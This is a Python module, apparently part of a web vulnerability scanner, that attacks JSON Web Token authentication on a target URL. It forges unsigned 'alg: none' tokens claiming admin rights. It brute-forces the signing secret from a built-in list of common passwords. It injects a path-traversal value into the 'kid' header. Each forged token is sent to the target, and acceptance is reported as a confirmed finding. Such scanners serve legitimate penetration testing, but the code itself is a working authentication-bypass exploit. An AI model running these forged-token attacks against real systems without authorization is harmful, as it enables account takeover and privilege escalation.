"""JWT Hunter — None algorithm, weak secret, kid injection."""
import base64
import json
import re
from typing import Dict, List, Optional
from urllib.parse import urlparse
from core.async_network import AsyncNetworkEngine

COMMON_SECRETS = [
    "secret", "password", "jwt_secret", "key", "secretkey",
    "123456", "admin", "token", "jwt", "pass", "12345",
    "secret123", "changeme", "default", "guest", "test",
]


def _b64decode(data: str) -> str:
    padded = data + "=" * ((4 - len(data) % 4) % 4)
    try:
        return base64.urlsafe_b64decode(padded).decode("utf-8", errors="replace")
    except Exception:
        return ""


def _b64encode(data: str) -> str:
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")


def _parse_jwt(token: str) -> dict:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64decode(parts[0]))
        payload = json.loads(_b64decode(parts[1]))
        return {"header": header, "payload": payload, "sig": parts[2]}
    except Exception:
        return None


def _extract_jwt(headers: dict, body: str, cookies: dict = None) -> str:
    auth = headers.get("authorization", headers.get("Authorization", ""))
    if auth.lower().startswith("bearer "):
        token = auth[7:]
        if len(token.split(".")) == 3:
            return token
    if cookies:
        for name in ["jwt", "token", "session", "auth"]:
            if name in cookies:
                c = cookies[name]
                if len(c.split(".")) == 3:
                    return c
    for match in re.finditer(r"eyJ[A-Za-z0-9_-]+\.ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", body or ""):
        return match.group()
    return None


async def none_algorithm(url: str, engine: AsyncNetworkEngine, is_protected: bool, session_manager=None) -> dict:
    if not is_protected:
        return None
    for alg in ["none", "None", "NONE"]:
        hdr = _b64encode(json.dumps({"alg": alg, "typ": "JWT"}))
        pld = _b64encode(json.dumps({"sub": "admin", "role": "admin"}))
        token = f"{hdr}.{pld}."
        r = await engine.ahttp_send(url, headers={"Authorization": f"Bearer {token}"}, timeout=10, state_context=session_manager)
        if r and r.get("status") == 200:
            return {"type": "jwt_none", "title": "JWT None Algorithm", "url": url[:200],
                    "detail": f"alg={alg} accepted", "confidence": "confirmed"}
    return None


async def weak_secret(url: str, engine: AsyncNetworkEngine, parsed: dict, is_protected: bool, session_manager=None) -> dict:
    if not is_protected or not parsed or not parsed.get("sig"):
        return None
    try:
        import jwt as pyjwt
        for secret in COMMON_SECRETS:
            try:
                token = pyjwt.encode({"sub": "admin", "role": "admin"}, secret, algorithm="HS256")
                if isinstance(token, bytes):
                    token = token.decode()
                r = await engine.ahttp_send(url, headers={"Authorization": f"Bearer {token}"}, timeout=10, state_context=session_manager)
                if r and r.get("status") == 200:
                    return {"type": "jwt_weak_secret", "title": "JWT Weak Secret",
                            "url": url[:200], "detail": f"Secret: {secret}", "confidence": "confirmed"}
            except Exception:
                continue
    except ImportError:
        pass
    return None


async def kid_injection(url: str, engine: AsyncNetworkEngine, parsed: dict, is_protected: bool, session_manager=None) -> dict:
    if not is_protected or not parsed or "kid" not in parsed.get("header", {}):
        return None
    for name, value in {"path_traversal": "../../dev/null"}.items():
        hdr = dict(parsed["header"])
        hdr["kid"] = value
        eh = _b64encode(json.dumps(hdr))
        ep = _b64encode(json.dumps(parsed["payload"]))
        token = f"{eh}.{ep}."
        r = await engine.ahttp_send(url, headers={"Authorization": f"Bearer {token}"}, timeout=10, state_context=session_manager)
        if r and r.get("status") == 200:
            return {"type": "jwt_kid_injection", "title": "JWT Kid Injection",
                    "url": url[:200], "detail": f"Vector: {name}", "confidence": "confirmed"}
    return None


async def scan_jwt(url: str, engine: AsyncNetworkEngine, session_manager=None) -> list:
    findings = []
    r = await engine.ahttp_send(url, timeout=10, state_context=session_manager)
    if not r or r.get("status", 0) <= 0:
        return findings
    cookies = session_manager.cookies.get(urlparse(url).netloc, {}) if session_manager else None
    token = _extract_jwt(dict(r.get("headers", {})), r.get("body", ""), cookies)
    if not token:
        return findings
    parsed = _parse_jwt(token)
    if parsed:
        findings.append({"type": "jwt_detected", "title": f"JWT Detected (alg: {parsed['header'].get('alg', '?')})",
                         "url": url[:200], "detail": json.dumps(parsed["payload"])[:100], "confidence": "info"})
    
    # Anti-false-positive control request: send a request with a completely invalid token
    r_control = await engine.ahttp_send(url, headers={"Authorization": "Bearer invalid.jwt.token"}, timeout=10, state_context=None)
    
    is_protected = True
    if r_control and r_control.get("status") == r.get("status"):
        baseline_body = r.get("body", "") or ""
        control_body = r_control.get("body", "") or ""

        # Check 1: Content similarity ratio (high similarity = endpoint ignores token)
        from difflib import SequenceMatcher
        similarity = SequenceMatcher(None, baseline_body[:2000], control_body[:2000]).ratio()
        if similarity > 0.92:
            is_protected = False

        # Check 2: Control response contains auth error keywords = endpoint IS protected
        error_keywords = ["unauthorized", "invalid token", "expired", "forbidden",
                          "authentication required", "access denied", "not authenticated",
                          '"error"', '"success":false', '"success": false']
        control_lower = control_body.lower()
        if any(kw in control_lower for kw in error_keywords):
            is_protected = True

    ne = await none_algorithm(url, engine, is_protected, session_manager)
    if ne:
        findings.append(ne)
    wk = await weak_secret(url, engine, parsed, is_protected, session_manager)
    if wk:
        findings.append(wk)
    ki = await kid_injection(url, engine, parsed, is_protected, session_manager)
    if ki:
        findings.append(ki)
    return findings